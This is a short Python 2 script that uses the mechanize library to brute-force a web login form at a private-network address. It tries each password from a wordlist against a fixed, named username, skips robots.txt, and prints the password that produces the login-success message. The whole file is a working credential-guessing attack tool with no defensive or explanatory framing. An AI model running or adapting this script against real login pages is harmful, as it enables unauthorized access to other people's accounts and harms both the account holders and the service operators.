import mechanize
import os
import time


url = 'http://10.10.1.2:8090/'
br = mechanize.Browser()
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
log = 'You have successfully logged in'
r = br.open(url)

def logger(user,passer):
    try:
        br.select_form(nr=0)
        br.form['username'] = user
        br.form['password'] = passer
        br.method = "POST"
        response = br.submit()
        content = response.get_data()
        if log in content:
            print '[+]Success! User = ' + user + ' password = ' + passer + '\n'
            br.close()
            exit(0)
        else:
            print '[-]Failed!! ' + passer + '\n'
            time.sleep(0.3)
            br.back()
    except:
        pass
 
def main():
    user = 'bbsingla_sms'
    passer = ''
    passFile = open('password1.txt', 'r')
    for line in passFile.readlines():
        passer = line.strip('\n')
        logger(user,passer)

if __name__ == '__main__':
    main()
